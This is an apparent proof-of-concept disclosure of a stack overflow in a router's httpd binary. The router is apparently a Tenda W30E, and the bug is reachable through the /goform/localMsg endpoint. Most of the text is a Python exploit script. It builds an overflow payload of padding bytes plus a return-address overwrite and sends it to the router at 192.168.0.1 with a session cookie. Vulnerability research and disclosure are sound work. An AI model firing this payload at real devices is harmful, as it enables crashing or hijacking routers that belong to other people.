...
httpd in directory `/bin` has a stack overflow vulnerability. The vulnerability occurrs in the `localMsg` function, which can be accessed via the URL `/goform/localMsg`
...
class HTTP:
    ...
    def Send(self, uri, headers={}, data=None, response=False,encode_params=True):
        ...
        #data='{"localMsg":{"msg":"auth.sms.result","data":"'+'b'*0x10c+p16(0x030F0)+p8(04)+'"}}'
        #print data
        if self.verbose:
            print url
...
if __name__ == '__main__':
    #Fireitup
    session='W30EV2.0:0.171.1:ddf3ab'
    ip = '192.168.0.1'  
    payload='msg=auth.sms.result&data='+'b'*0x124+'%f0%30%04'#p16(0x030F0)+p8(04)
    # 构造http数据包
    s='1'
    pdata = {
    ...
    # 发起http请求
    try:
        HTTP(ip).Send('/goform/localMsg?'+payload, data='',headers=header,encode_params=False,response=True)
        print '[+] execute ok'
